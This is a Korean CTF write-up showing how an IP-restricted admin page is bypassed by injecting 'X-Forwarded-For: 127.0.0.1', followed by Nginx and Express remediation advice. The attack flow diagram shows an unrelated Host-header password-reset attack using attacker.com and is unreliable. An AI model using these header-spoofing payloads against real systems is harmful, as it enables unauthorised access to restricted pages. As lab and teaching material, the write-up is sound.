+++
title = "VulnABLE CTF [LUXORA] Write-up: Header Injection 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Header Injection", "Silver", "IP Spoofing", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Header Injection 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (Header Injection)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/header-inject/silver`
- **목표**: 오직 사내 내부 IP(`127.0.0.1` 또는 `192.168.x.x`)에서만 접근할 수 있도록 제한된 관리자 페이지를, HTTP 헤더 변조를 통한 **IP Spoofing(IP 위장)** 기법으로 우회하여 접속하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/header-inject/silver` 관리자 대시보드에 접근을 시도합니다.

**[정상 접속 시도]**
```http
GET /header-inject/silver HTTP/1.1
Host: localhost:3000
```

**[서버의 에러 응답]**
```html
<div class="error">
  <h3>403 Forbidden</h3>
  <p>Access denied. This page is only accessible from the internal corporate network (e.g., 127.0.0.1).</p>
  <p>Your IP: 10.10.10.99</p>
</div>
```

**[해커의 사고 과정]**
1. 이 페이지는 IP 주소(나의 IP는 `10.10.10.99`)를 기반으로 접근 제어(Access Control)를 하고 있다.
2. 서버는 클라이언트의 IP를 어떻게 알아낼까? 백엔드 프레임워크(Express, Spring 등)는 기본적으로 TCP 소켓의 출발지 IP를 보지만, 로드밸런서(LB)나 리버스 프록시 뒤에 있을 경우 `X-Forwarded-For` 나 `X-Real-IP` 같은 **HTTP 헤더**를 읽어서 진짜 사용자 IP를 판단한다.
3. 이 시스템이 만약 프록시 설정을 잘못하여 클라이언트가 직접 주입한 X-Forwarded-For 헤더를 맹신한다면?

---

## 💥 2. 취약점 식별 및 IP 스푸핑 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Host: attacker.com)--> [ Web Server ]
                                       |-- Generates Password Reset Link
<-- Link: http://attacker.com/reset ---|
```


Burp Suite의 Repeater를 열고, 원래 요청에 다양한 IP 관련 헤더들을 수동으로 추가해 봅니다. 타겟 IP는 에러 메시지에 힌트로 적혀있던 `127.0.0.1` (로컬호스트)입니다.

### 💡 테스트할 주요 헤더 목록
- `X-Forwarded-For: 127.0.0.1`
- `X-Real-IP: 127.0.0.1`
- `Client-IP: 127.0.0.1`
- `X-Originating-IP: 127.0.0.1`
- `X-Remote-IP: 127.0.0.1`

### 페이로드 전송 (X-Forwarded-For 주입)
가장 대표적인 헤더인 `X-Forwarded-For` 를 주입하여 요청을 다시 보냅니다.

```http
GET /header-inject/silver HTTP/1.1
Host: localhost:3000
X-Forwarded-For: 127.0.0.1
```

---

## 🚀 3. 공격 수행 및 결과 확인

### 🔍 조작된 서버의 응답
서버는 이 헤더를 보고, "아, 로드밸런서를 거쳐서 온 요청이구나. 진짜 클라이언트 IP는 `127.0.0.1`이네! 우리 사내 직원이군!" 이라고 완벽하게 속아 넘어갑니다.

```html
<div class="admin-dashboard">
  <h3>Welcome to the Internal Admin Portal</h3>
  <p>System Status: All Green</p>
  <p class="secret">FLAG{HEADER_🥈_IP_SPOOFING_D4E5F6}</p>
</div>
```

내부망 전용 페이지가 열리고, 플래그가 나타났습니다!

---

## 🚩 4. 롸잇업 결론 및 플래그

네트워크 아키텍처 상의 신뢰 경계(Trust Boundary) 설정 오류를 악용하여, 단순한 텍스트 한 줄(헤더) 추가만으로 방화벽의 IP 차단 정책을 뚫어냈습니다.

**🔥 획득한 플래그:**
`FLAG{HEADER_🥈_IP_SPOOFING_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
이 취약점은 애플리케이션 코드가 아니라 **웹 서버 아키텍처 설정**의 오류에 기인합니다. 

* **취약한 논리적 오류**
클라이언트(해커) -> 리버스 프록시(Nginx) -> 백엔드(Node.js) 구조에서, Nginx가 클라이언트가 보낸 기존의 `X-Forwarded-For` 헤더를 초기화(Drop)하지 않고 그대로 백엔드로 토스해 버린 것입니다. 백엔드는 이를 신뢰하고 IP 검증을 통과시켰습니다.

* **안전한 패치 가이드 (신뢰할 수 있는 프록시 설정)**
1. **리버스 프록시(Nginx 등) 단에서 차단**: 
   외부망에서 들어오는 트래픽에 대해서는 클라이언트가 주입한 모든 IP 관련 헤더를 무시(Drop)하고, 프록시 장비가 직접 생성한 헤더만 백엔드로 전달하도록 설정해야 합니다.
   ```nginx
   # Nginx 설정 예시: 기존 헤더를 덮어쓰고 진짜 IP를 기록함
   proxy_set_header X-Forwarded-For $remote_addr;
   ```

2. **백엔드 프레임워크의 Proxy 신뢰 설정**:
   Express.js 같은 프레임워크에서는 어느 프록시(IP)에서 오는 헤더만 신뢰할 것인지 명시적으로 지정해야 합니다.
   ```javascript
   // Express 예시: "trust proxy"를 무조건 켜지 말고, 신뢰하는 앞단 LB의 IP만 지정
   app.set('trust proxy', '10.0.0.5'); // 로드밸런서 IP만 신뢰
   ```
   이렇게 설정하면 해커가 외부에서 `X-Forwarded-For`를 아무리 변조해도, 프레임워크는 이를 무시하고 해커의 실제 IP로 접근 제어 로직을 수행하게 됩니다.